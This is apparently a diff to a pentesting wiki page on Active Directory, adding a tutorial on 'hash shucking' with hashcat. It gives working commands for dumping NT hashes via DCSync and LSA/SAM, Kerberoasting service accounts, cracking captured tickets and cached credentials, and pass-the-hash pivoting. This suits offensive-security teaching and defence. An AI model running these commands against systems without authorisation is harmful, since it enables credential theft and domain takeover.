@@ -153,6 +153,104 @@ If you can **access other PCs or shares** with the **null or guest user** you co
 ../ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
+### Hash Shucking & NT-Candidate Attacks
+
+**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.
+
+Use shucking when:
+
+- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
+- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
+- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.
+
+The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.
+
+#### Building an NT hash corpus
+
+- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):
+
+  ```bash
+  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
+  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
+  ```
+
+  History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:
+
+{{#ref}}
+dcsync.md
+{{#endref}}
+
+- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
+- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
+- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.
+
+#### Hashcat NT-candidate modes
+
+| Hash Type                                | Password Mode | NT-Candidate Mode |
+| ---------------------------------------- | ------------- | ----------------- |
+| Domain Cached Credentials (DCC)          | 1100          | 31500             |
+| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
+| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
+| NetNTLMv2                                | 5600          | 27100             |
+| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
+| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
+| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |
+
+Notes:
+
+- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
+- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
+- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
+- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.
+
+#### Example – Kerberoast RC4 (mode 35300)
+
+1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):
+
+{{#ref}}
+kerberoast.md
+{{#endref}}
+
+   ```bash
+   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
+   ```
+
+2. Shuck the ticket with your NT list:
+
+   ```bash
+   hashcat -m 35300 roastable_TGS nt_candidates.txt
+   ```
+
+   Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.
+
+3. Immediately pivot via PtH:
+
+   ```bash
+   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
+   ```
+
+   You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.
+
+#### Example – Cached credentials (mode 31600)
+
+1. Dump cached logons from a compromised workstation:
+
+   ```bash
+   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
+   ```
+
+2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:
+
+   ```bash
+   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
+   ```
+
+3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.
+
+The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.
+
+
+
 ## Enumerating Active Directory WITH credentials/session
 
 For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.
@@ -854,5 +952,7 @@ https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-move
 - [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
 - [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
+- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
+- [Hashcat](https://github.com/hashcat/hashcat)
 
 {{#include ../../banners/hacktricks-training.md}}
